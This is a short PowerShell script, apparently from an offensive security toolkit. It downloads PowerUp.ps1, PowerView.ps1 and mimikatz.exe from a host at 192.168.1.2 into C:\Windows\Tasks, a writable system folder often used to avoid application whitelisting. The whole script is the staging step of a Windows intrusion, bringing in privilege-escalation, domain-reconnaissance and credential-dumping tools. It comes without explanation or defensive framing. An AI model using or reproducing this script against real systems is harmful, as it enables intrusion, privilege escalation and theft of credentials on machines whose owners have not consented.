$baseUrl = "http://192.168.1.2/"
$fileNames = @("PowerUp.ps1", "PowerView.ps1", "mimikatz.exe")
$downloadPath = "C:\Windows\Tasks"

foreach ($fileName in $fileNames) {
    $url = $baseUrl + $fileName
    $filePath = Join-Path $downloadPath $fileName
    Invoke-WebRequest -Uri $url -OutFile $filePath
    Write-Host "Downloaded $fileName to $filePath"
}